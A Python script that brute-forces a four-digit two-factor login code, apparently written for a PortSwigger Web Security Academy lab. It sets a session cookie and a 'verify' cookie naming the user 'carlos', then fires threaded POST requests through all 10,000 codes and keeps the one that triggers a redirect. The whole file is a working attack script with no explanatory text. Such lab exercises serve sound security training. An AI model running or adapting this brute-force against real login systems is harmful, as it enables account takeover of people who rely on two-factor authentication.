import requests
from threading import Thread

url = """https://0a9000510374308b80f585c10047009d.web-security-academy.net/login2"""
cookie = {"session":"foxmIdSw6UZP9M0eUrKtY2Hb0OlZVluK", "verify":"carlos"}
results = []
def try_number(number):
    body = { "mfa-code":f"{number}".zfill(4)}
    r = requests.post(url, cookies=cookie, data=body)
    if r.history:
            mfa_number = body.get("mfa-code")
            results.append(mfa_number)
    

threads = []
max_threads = 30
for i in range(10000):
    t = Thread(target=try_number, args=(i,))
    threads.append(t)
    t.start()
    print(i)

    if results:
         print(results[0])
         break
    if len(threads) >= max_threads:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()
